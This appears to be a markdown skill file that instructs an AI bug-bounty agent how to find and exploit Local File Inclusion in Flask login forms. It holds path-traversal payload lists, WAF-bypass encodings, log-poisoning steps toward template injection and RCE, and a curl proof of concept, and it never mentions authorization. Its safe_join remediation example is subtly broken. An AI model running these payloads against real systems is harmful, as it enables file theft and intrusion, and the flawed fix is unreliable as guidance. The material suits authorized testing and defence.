# 📂 Flask Login Form – Local File Inclusion (LFI) – AI Bug Bounty Skill

## Skill Name
`flask-lfi-login`

## Description
Specialised detection and exploitation of Local File Inclusion vulnerabilities within Python Flask login forms. This skill analyses how user-controllable parameters – such as language selectors, template names, error codes, redirect pages, or help-document references – are used by the server to construct file paths for reading, rendering, or sending files. When path validation is absent, attackers can traverse directories to read sensitive files, view application source code, or chain LFI with template injection to achieve remote code execution.

## Affected Components
- **`render_template()`** calls where the template name is built using user input:
  ```python
  @app.route('/login')
  def login():
      page = request.args.get('page', 'login')
      return render_template(f"{page}.html")
  ```
- **`send_file()` / `send_from_directory()`** with an unsanitised filename:
  ```python
  return send_file(os.path.join('templates', request.args.get('file')))
  ```
- **`open()`** or file read operations that include user input in the path, used to load custom error pages, CSS, or language files.
- **Language/localisation files**: `lang` parameter that loads `login_<lang>.html`.
- **Custom error pages**: `error` parameter that maps to an error template like `errors/<error_code>.html`.
- **Help or documentation links**: `doc` parameter that includes a file.
- **Redirect-after-login parameter** (`next`, `redirect`) misused to specify a local page to render instead of redirecting.
- **Login form theming or skinning**: `theme` parameter that loads `themes/<theme>/login.html`.
- **File uploads (avatar) for user profiles** that are later displayed on the login page (if the login form shows recent users or avatars); if the file path is built from user-controlled data, LFI can occur.

## Detection Patterns (Static & Dynamic)
### 1. User-Controlled Path Segment in `render_template`
- **Code heuristic**: `render_template(request.args.get('template') + '.html')` or `render_template(f"login_{lang}.html")`.
- **Dynamic test**: Provide `../etc/passwd` as the parameter; if the server returns content or an error revealing the attempted path, LFI is possible.

### 2. Unsafe File Reading for Error Pages
- **Pattern**:
  ```python
  error = request.args.get('error', '404')
  with open(f'errors/{error}.html', 'r') as f:
      return f.read()
  ```
- **Dynamic test**: Set `error` to `../../../../etc/passwd` (with or without null byte/terminator).

### 3. `send_from_directory` with User-Controlled Filename
- **Example**: `return send_from_directory('static/docs', request.args.get('file'))`
- **Dynamic test**: `file=../../app.py` to download application source.

### 4. Language File Inclusion
- A parameter like `?lang=en` loads `login_en.html`. Inject `lang=../../../../etc/passwd%00` (null byte injection if Flask runs on Python 2 or vulnerable Werkzeug versions).

### 5. Error Message Path Disclosure
- Invalid paths may trigger exceptions that reveal the server's file system structure (e.g., `IOError`, `TemplateNotFound` with full path). Use this to confirm directory depth.

## Testing Methodology (AI Agent Steps)
1. **Identify Parameters Handling File/Page Names**
   - Examine URL query strings and POST body parameters during login.
   - Look for names like `template`, `page`, `file`, `doc`, `lang`, `theme`, `skin`, `error`, `view`, `include`, `help`.
   - Observe if changing the value alters the page layout, language text, or error message content.

2. **Probe for Path Traversal**
   - Inject `../` sequences to break out of the intended directory.
   - Start with `../` and monitor for error messages (file not found, traceback) that indicate the path is being processed.
   - Use simple test: `?template=../../../etc/passwd` – if the response contains “root:x:0:0” or similar, LFI is confirmed.
   - If the application appends an extension (`.html`), attempt to remove it with a null byte: `%00` (in Python 2) or use a path truncation technique if applicable (unlikely in modern Python, but try `?template=../../../etc/passwd%00`).

3. **File Read via LFI (Classic)**
   - **Linux targets**:
     - `/etc/passwd`
     - `/etc/hostname`
     - `/proc/self/environ`
     - `/proc/self/cmdline`
     - Application source: `../app.py`, `../config.py`, `../requirements.txt`
   - **Windows targets** (if Flask deployed on Windows):
     - `..\\..\\..\\windows\\win.ini`
     - `..\\..\\..\\boot.ini`
   - Use both forward and backward slashes; some frameworks normalise slashes.

4. **Bypassing Extension Appends**
   - If the app forces `.html` extension, LFI to PHP/RCE is not directly possible, but you can still read sensitive `.py` files if the extension is not enforced for all paths (e.g., the code only appends `.html` if no extension in input). Test with `?page=../../app.py` (without `.html`) – might bypass extension addition.
   - Use path truncation with length limits (not common in Python).
   - Double extension: `?page=../../../etc/passwd%00.html` (null byte).

5. **Chaining LFI with Template Injection (RCE)**
   - If `render_template()` is used and the attacker can include an existing server-side template file that contains Jinja2 expressions (like a file uploaded elsewhere, or a log file poisoned with `{{ config }}`), LFI can escalate to SSTI and RCE.
   - Poison a log file (e.g., `/var/log/auth.log`) by injecting a payload into the username field during login attempts, then include that log file via LFI.
   - If the server-side code uses `render_template_string()` on the file content after reading, direct RCE is possible.

6. **Out-of-Band Data Exfiltration (Blind LFI)**
   - If no direct output, but file inclusion is confirmed via an error/time-based oracle, use wrapper techniques (unlikely in pure Flask, but if `php://` wrappers exist due to unsupported configuration). Usually not applicable.

7. **Filter Evasion & WAF Bypass**
   - **Encoding**: `%2e%2e%2f` (`.`, `.`, `/`), `%252e%252e%252f` (double URL encoding).
   - **Path normalisation tricks**: `....//....//etc/passwd`, `..\..\etc\passwd` (mixed slashes), `..;/..;/etc/passwd`.
   - **Absolute paths**: try `//etc/passwd`, `/etc/passwd` directly.
   - **Directory self-reference**: `./../../../etc/passwd`.
   - **Unicode/UTF-8 overlong encoding**: `%c0%ae%c0%ae/` (if server decodes incorrectly – mostly historical).

## Essential Payloads (Flask Login LFI)
### Basic Traversal (No extension appended)
```
../../../etc/passwd
../../../../etc/passwd
/../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
```

### Bypass Extension `.html` Appended (Null Byte)
```
../../../etc/passwd%00
../../../etc/passwd%00.html
../../../etc/passwd%2500 (double encoded null)
```

### Source Code Disclosure
```
../../app.py
../../config.py
../../templates/login.html  (to verify template injection possibility)
../../../proc/self/environ
../../../proc/self/cmdline
```

### Windows
```
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
```

### LFI to RCE via Log Poisoning (example)
```
?page=../../var/log/nginx/access.log
(Poison log by sending a request with User-Agent: {{config}})
Then the included log file will be rendered as Jinja2, leaking config.
```

## Secure Coding Recommendations
- **Never concatenate user input into file paths**; use a strict whitelist or mapping.
  ```python
  PAGES = {'login': 'login.html', 'help': 'help.html'}
  page = PAGES.get(request.args.get('page'), 'login.html')
  return render_template(page)
  ```
- **Use `safe_join`** and validate the final path is within the intended directory.
  ```python
  import os
  from werkzeug.security import safe_join
  full_path = safe_join('templates', request.args.get('page') + '.html')
  if full_path is None or not full_path.startswith(os.path.abspath('templates')):
      abort(404)
  return render_template(full_path)
  ```
- **Disable the ability to read arbitrary files** from the web process using OS-level permissions (least privilege).
- **Avoid null byte vulnerabilities** by using modern Python (3.x); still sanitise input.
- **Use `send_file` with `as_attachment=False` and a whitelisted directory**; never accept user-provided paths directly.
- **Monitor for unexpected file accesses** in application logs.

## Output Format (Bug Report)
```
Title: Local File Inclusion via `page` Parameter in Login Form
Severity: High (Critical if chained to RCE)
Endpoint: GET /login
Vulnerable Parameter: page
Description:
  The login endpoint uses the `page` parameter to dynamically construct a template path without sanitisation. An attacker can perform path traversal to read arbitrary files from the server.
Proof of Concept:
  curl -v "https://target.com/login?page=../../../etc/passwd"
  Response contains the contents of /etc/passwd.
Remediation:
  Implement a whitelist of allowed page values, or use werkzeug.security.safe_join with directory containment check.
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with Jinja2 templates and file system access
- **Testing Type**: Black-box / Grey-box
- **Dependencies**: None; AI can manipulate paths and interpret server responses.